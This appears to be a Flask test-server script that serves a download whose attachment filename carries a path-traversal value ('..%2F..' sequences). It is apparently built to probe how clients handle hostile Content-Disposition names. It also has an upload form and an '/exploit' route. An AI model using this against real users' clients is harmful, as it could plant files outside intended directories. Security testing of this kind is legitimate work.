"""
 @Author  : Alfons
 @Contact: alfons_xh@163.com
 @File    : HttpsServerFlask.py
 @Time    : 2018/8/6 14:26
"""
from flask import Flask, send_file, send_from_directory, make_response, request, redirect, url_for
from werkzeug.utils import secure_filename

app = Flask(__name__)

header = """
Content-Length: 83660
X-NWS-LOG-UUID: dbdd0739-6264-4479-a6ed-7cbc6de77231 0c420a980f0b5659142caf11d011fb33
X-Cache-Lookup: Hit From Disktank
Server: NWS_UGC_HY
Connection: keep-alive
Content-Disposition: attachment; filename="../filename.jpg"
"""


@app.route("/img")
def Download():
    # rsp = make_response(send_from_directory(directory="./", filename="Encrypt.png", as_attachment=True))
    # rsp.headers["Content-Disposition"] = 'attachment; filename="../filename"'
    # return rsp
    return send_from_directory(directory="./", filename="Encrypt.png", as_attachment=True,
                               attachment_filename="..%2F..%2F..%2F..%2Ffilename.png")


@app.route("/upload", methods=["GET", "POST"])
def Upload():
    if request.method == "POST":
        file = request.files["file"]
        if file:
            filename = secure_filename(file.filename)
            file.save(filename)
            return redirect(url_for("Upload", filename=filename))
    return '''
        <!doctype html>
        <title>Upload new File</title>
        <h1>Upload new File</h1>
        <form>
            <input id="file" name="file" type="file" />
            <input id="token" name="token" type="hidden" />
        </form>
        <script>
            $("#file").on("change", function(){
                var formData = new FormData();
                formData.append("file", $("#file")[0].files);
                formData.append("token", $("#token").val());
                $.ajax({
                      url: "127.0.0.1:5000/upload",
                      type: "POST",
                      data: formData,
                      processData: false,
                      contentType: false,
                      success: function(response){
                              // 根据返回结果指定界面操作
                      }
                });
            });
        </script>
        '''


@app.route("/exploit")
def exploit():
    return app.send_static_file('exploit.html')


if __name__ == "__main__":
    app.debug = True
    app.run(host="0.0.0.0")
